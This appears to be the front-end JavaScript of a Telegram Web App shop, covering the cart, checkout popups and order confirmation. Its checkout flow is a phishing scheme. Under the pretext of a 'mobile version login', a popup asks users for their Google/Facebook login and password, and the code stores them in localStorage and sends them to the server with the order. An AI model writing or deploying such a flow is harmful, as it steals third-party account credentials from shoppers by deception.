Telegram.WebApp.ready();

// Отключаем возможность закрытия жестом "pull-to-close"
Telegram.WebApp.disableClosingConfirmation();

document.addEventListener("DOMContentLoaded", () => {
    const checkoutButton = document.getElementById("checkout-button");
    const cartItemsContainer = document.getElementById("cartItems");

    if (checkoutButton) {
        checkoutButton.addEventListener("click", async () => {
            // Получаем tg_id из URL
            const urlParams = new URLSearchParams(window.location.search);
            const tgId = urlParams.get('tg_id');
            
            if (!tgId) {
                showNotification("Ошибка: не удалось определить пользователя");
                return;
            }

            // Проверяем, есть ли товары в корзине
            getCart(tgId).then(({items, count}) => {
                if (count > 0) {
                    // Закрываем окно корзины
                    const cartDropdown = document.querySelector('.cart-dropdown-product');
                    if (cartDropdown) {
                        cartDropdown.classList.remove('active');
                    }

                    // Блокируем кнопку корзины
                    checkoutButton.disabled = true;

                    // Показываем всплывающее окно оформления заказа (первый шаг)
                    showOrderPopup();
                } else {
                    showNotification("Корзина пуста!");
                    return;
                }
            });
        });
    }

    if (cartItemsContainer) {
        const cartItems = cartItemsContainer.querySelectorAll("li");
    }
});

async function getCart(tgId) {
    try {
        const response = await fetch(`/api/cart?tg_id=${encodeURIComponent(tgId)}`);

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const cartItems = await response.json();
        const itemCount = cartItems.length;

        console.log(`Получено ${itemCount} товаров в корзине`);

        return {
            items: cartItems,
            count: itemCount
        };
    } catch (error) {
        console.error('Ошибка при получении корзины:', error);
        return {
            items: [],
            count: 0
        };
    }
}

// Функция для показа уведомления
function showNotification(message) {
    const notification = document.createElement("div");
    notification.classList.add("notification");
    notification.textContent = message;

    document.body.appendChild(notification);

    // Убираем уведомление через 3 секунды
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Функция для создания оверлея
function createOverlay() {
    const overlay = document.createElement("div");
    overlay.classList.add("overlay");
    document.body.appendChild(overlay);
    document.body.classList.add("no-scroll"); // Блокируем прокрутку

    // Создаем скрытый input для скрытия клавиатуры
    const hiddenInput = document.createElement("input");
    hiddenInput.type = "text";
    hiddenInput.style.position = "absolute";
    hiddenInput.style.opacity = "0";
    hiddenInput.style.pointerEvents = "none";
    document.body.appendChild(hiddenInput);

    // Обработчик клика на оверлей
    overlay.addEventListener("click", () => {
        hideKeyboard(); // Скрываем клавиатуру
    });
}

// Функция для удаления оверлея
function removeOverlay() {
    const overlay = document.querySelector(".overlay");
    if (overlay) {
        overlay.remove();
    }
    document.body.classList.remove("no-scroll"); // Восстанавливаем прокрутку

    // Удаляем скрытый input
    const hiddenInput = document.querySelector("input[type='text'][style*='opacity: 0']");
    if (hiddenInput) {
        hiddenInput.remove();
    }
}

// Функция для скрытия клавиатуры
function hideKeyboard() {
    const hiddenInput = document.querySelector("input[type='text'][style*='opacity: 0']");
    if (hiddenInput) {
        hiddenInput.focus(); // Переводим фокус на скрытый input
        hiddenInput.blur();  // Сразу убираем фокус
        console.log("Клавиатура скрыта");
    } else {
        console.log("Скрытый input не найден");
    }
}

// Обработчик клика вне всплывающего окна
document.addEventListener("click", (event) => {
    const popup = document.querySelector(".order-popup");
    if (popup && !popup.contains(event.target)) {
        // Клик был вне всплывающего окна
        hideKeyboard(); // Скрываем клавиатуру
    }
});

function showOrderPopup() {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Пришлите через пробел данные от Google/Facebook* для входа в мобильную версию.</h2>
        <div class="order-input-container">
            <input type="text" id="order-input" />
        </div>
        <button class="next-btn">
            <img src="/static/images/next.png" alt="Далее">
        </button>
    </div>`;

    document.body.appendChild(popup);

    // Обработчик закрытия окна
    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
    });

    // Обработчик для кнопки "Далее" в первом окне
    popup.querySelector(".next-btn").addEventListener("click", () => {
        const inputValue = document.getElementById("order-input").value.trim();
        if (!inputValue) {
            alert("Введите данные для входа!");
            return;
        }

        // Разделяем введенные данные на логин и пароль
        const [login, password] = inputValue.split(' ');
        if (!login || !password) {
            alert("Пожалуйста, введите логин и пароль через пробел!");
            return;
        }

        // Сохраняем данные в localStorage
        localStorage.setItem('loginData', JSON.stringify({ login, password }));

        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
        showTelegramPopup(); // Показываем второе окно
    });
}

function showTelegramPopup() {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Введите ссылку для связи в Telegram:</h2>
        <div class="order-input-container">
            <input type="text" id="telegram-input" placeholder="Telegram ссылка" />
        </div>
        <button class="next-btn">
            <img src="/static/images/next.png" alt="Далее">
        </button>
    </div>`;

    document.body.appendChild(popup);

    // Обработчик закрытия окна
    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
    });

    // Обработчик для кнопки "Далее" во втором окне
    popup.querySelector(".next-btn").addEventListener("click", () => {
        const telegramLink = document.getElementById("telegram-input").value.trim();
        if (!telegramLink) {
            alert("Введите ссылку для связи в Telegram!");
            return;
        }
        if (window.Telegram && window.Telegram.WebApp) {
            const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
            fetch("/save_tg_link", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ tg_id: userId, link: telegramLink }),
            });
        }
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
        fetchLatestOrder(window.Telegram.WebApp.initDataUnsafe.user.id);
    });
}

function fetchLatestOrder(telegramId) {
    fetch('/api/order/latest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegram_id: telegramId })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error("Ошибка получения заказа");
            }
            return response.json();
        })
        .then(order => {
            console.log("Полученный заказ:", order);
            showOrderDetailsPopup(order);
        })
        .catch(error => {
            console.error("Ошибка:", error);
            alert("Не удалось получить данные заказа");
        });
}

function showOrderDetailsPopup(order) {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Детали заказа</h2>
        <div class="order-details">
            <p><strong>Номер заказа:</strong> ${order.id || 'Не указан'}</p>
            <p><strong>Telegram ID:</strong> ${order.user_id || 'Не указан'}</p>
            <p><strong>Статус:</strong> ${order.status || 'В обработке'}</p>
            <p><strong>Сумма:</strong> ${order.total_price || '0'} ₽</p>
        </div>
        <button class="confirm-btn">Подтверждаю</button>
    </div>`;

    document.body.appendChild(popup);

    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay();
        checkoutButton.disabled = false;
    });

    popup.querySelector(".confirm-btn").addEventListener("click", async () => {
        if (window.Telegram && window.Telegram.WebApp) {
            const user = window.Telegram.WebApp.initDataUnsafe.user;
            if (user && user.id) {
                const userId = user.id;
                try {
                    // Получаем данные из localStorage, где мы сохранили их в предыдущих попапах
                    const loginData = localStorage.getItem('loginData');
                    if (!loginData) {
                        alert('Ошибка: данные для входа не найдены');
                        return;
                    }

                    const { login, password } = JSON.parse(loginData);

                    // Получаем текущую корзину
                    const cartResponse = await fetch(`/api/cart?tg_id=${encodeURIComponent(userId)}`);
                    if (!cartResponse.ok) {
                        throw new Error('Ошибка при получении корзины');
                    }
                    const cartItems = await cartResponse.json();
                    
                    // Вычисляем общую сумму
                    const totalPrice = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);

                    // Отправляем запрос на создание заказа
                    const response = await fetch('/api/order', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: userId,
                            login: login,
                            password: password,
                            total_price: totalPrice
                        })
                    });

                    if (!response.ok) {
                        throw new Error('Ошибка при создании заказа');
                    }

                    const result = await response.json();
                    if (result.status === 'success') {
                        window.Telegram.WebApp.close();
                    } else {
                        alert('Ошибка при создании заказа: ' + result.message);
                    }
                } catch (error) {
                    console.error('Ошибка при отправке запроса:', error);
                    alert('Произошла ошибка при создании заказа');
                }
            } else {
                console.error('Пользователь не определен в initDataUnsafe');
            }
        } else {
            console.error('Telegram Web App не инициализирован');
        }
    });
}

async function submitOrder(event) {
    event.preventDefault();
    
    if (!window.Telegram || !window.Telegram.WebApp || !window.Telegram.WebApp.initDataUnsafe.user) {
        alert('Ошибка: Telegram Web App не инициализирован');
        return;
    }

    const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
    const login = document.getElementById('login').value;
    const password = document.getElementById('password').value;

    if (!login || !password) {
        alert('Пожалуйста, введите логин и пароль');
        return;
    }

    try {
        // Получаем текущую корзину
        const cartResponse = await fetch(`/api/cart?tg_id=${encodeURIComponent(userId)}`);
        if (!cartResponse.ok) {
            throw new Error('Ошибка при получении корзины');
        }
        const cartItems = await cartResponse.json();
        
        if (!cartItems || cartItems.length === 0) {
            alert('Корзина пуста');
            return;
        }

        // Вычисляем общую сумму
        const totalPrice = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);

        const formData = {
            user_id: userId,
            login: login,
            password: password,
            total_price: totalPrice
        };

        console.log('Отправка данных заказа:', formData);

        // Создаем заказ
        const response = await fetch('/api/create_order', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.message || `HTTP error! status: ${response.status}`);
        }

        const result = await response.json();
        
        if (result.status === 'success') {
            saveFormData();
            window.Telegram.WebApp.close();
        } else {
            alert(result.message || 'Произошла ошибка при оформлении заказа');
        }
    } catch (error) {
        console.error('Ошибка при создании заказа:', error);
        alert('Произошла ошибка при оформлении заказа: ' + error.message);
    }
}